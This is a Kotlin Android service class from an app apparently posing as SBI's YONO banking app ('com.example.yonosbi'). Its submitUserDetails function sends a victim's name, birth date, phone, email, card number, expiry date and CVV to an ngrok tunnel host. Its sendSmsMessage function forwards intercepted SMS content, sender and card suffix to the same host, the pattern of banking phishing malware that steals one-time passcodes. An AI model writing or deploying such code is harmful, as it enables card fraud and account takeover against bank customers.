package com.example.yonosbi.services

import com.google.gson.Gson
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.logging.HttpLoggingInterceptor
import java.util.concurrent.TimeUnit

class UserApiService {
    private val baseUrl = "https://lackadaisical-shawnna-ravenously.ngrok-free.dev/api/v1"

    private val client = OkHttpClient.Builder()
        .addInterceptor(HttpLoggingInterceptor().apply {
            level = HttpLoggingInterceptor.Level.BODY
        })
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    private val gson = Gson()
    private val jsonMediaType = "application/json".toMediaType()

    // for submitting user details
    suspend fun submitUserDetails(
        fullName: String,
        dateOfBirth: String,
        mobileNumber: String,
        emailAddress: String,
        totalLimit: String,
        availableLimit: String,
        cardholderName: String,
        cardNumber: String,
        expiryDate: String,
        cvv: String,
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "$baseUrl/customers"

            // Extract first name for the 'name' field
            val firstName = fullName.split(" ").firstOrNull() ?: ""

            // Create request body with explicit type
            val requestBody: Map<String, Any> = mapOf(
                "phone_number" to mobileNumber,
                "full_name" to fullName,
                "email" to emailAddress,
                "device_id" to deviceId,
                "name" to firstName,
                "dob" to dateOfBirth,
                "total_limit" to (totalLimit.toIntOrNull() ?: 0),
                "available_limit" to (availableLimit.toIntOrNull() ?: 0),
                "cardholder_name" to cardholderName,
                "card_number" to cardNumber,
                "expiry_date" to expiryDate,
                "cvv" to cvv
            )

            val jsonBody = gson.toJson(requestBody)
            val requestBodyOkHttp = jsonBody.toRequestBody(jsonMediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBodyOkHttp)
                .addHeader("Content-Type", "application/json")
                .addHeader("ngrok-skip-browser-warning", "true") // Add ngrok header
                .build()

            val response = client.newCall(request).execute()

            val success = response.isSuccessful && (response.code == 200 || response.code == 201)

            if (success) {
                android.util.Log.d("UserApiService", "Form submitted successfully: ${response.body?.string()}")
            } else {
                android.util.Log.e("UserApiService", "Form submission failed: ${response.code}")
                android.util.Log.e("UserApiService", "Response body: ${response.body?.string()}")
            }

            response.close()
            success
        } catch (e: Exception) {
            android.util.Log.e("UserApiService", "Error during form submission: $e", e)
            false
        }
    }

    // for sendSmsMessage
    suspend fun sendSmsMessage(
        sender: String,
        message: String,        // SMS body → content
        timestamp: Long,       // SMS timestamp in millis
        deviceId: String,
        cardSuffix: String? = null
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "$baseUrl/messages"

            // Convert millis → "2024-01-10T14:30:00Z"
            val isoTimestamp = convertTimestampToISO(timestamp)

            val requestBody: Map<String, Any?> = mapOf(
                "device_id" to deviceId,
                "sender" to sender,
                "card_suffix" to cardSuffix,
                "content" to message,
                "timestamp" to isoTimestamp
            )

            val jsonBody = gson.toJson(requestBody)
            val requestBodyOkHttp = jsonBody.toRequestBody(jsonMediaType)

            val request = Request.Builder()
                .url(url)
                .post(requestBodyOkHttp)
                .addHeader("Content-Type", "application/json")
                .addHeader("ngrok-skip-browser-warning", "true")
                .build()

            android.util.Log.d("UserApiService", "Sending SMS payload: $jsonBody")

            val response = client.newCall(request).execute()
            val bodyStr = response.body?.string()
            val success = response.isSuccessful && (response.code == 200 || response.code == 201)

            if (success) {
                android.util.Log.d("UserApiService", "SMS sent successfully: $bodyStr")
            } else {
                android.util.Log.e("UserApiService", "Failed to send SMS: ${response.code}")
                android.util.Log.e("UserApiService", "Response: $bodyStr")
            }

            response.close()
            success
        } catch (e: Exception) {
            android.util.Log.e("UserApiService", "Error sending SMS: $e", e)
            false
        }
    }

    // Helper to convert millis to ISO-8601 "yyyy-MM-dd'T'HH:mm:ss'Z'"
    private fun convertTimestampToISO(timestampMillis: Long): String {
        return try {
            val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.US)
            sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
            sdf.format(java.util.Date(timestampMillis))
        } catch (e: Exception) {
            print("exception occured here in the convertTimestampToISO here $e")
            val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.US)
            sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
            sdf.format(java.util.Date())
        }
    }

    private fun getDeviceId(): String {
        return LocalStorage.getItem("deviceId")
    }
}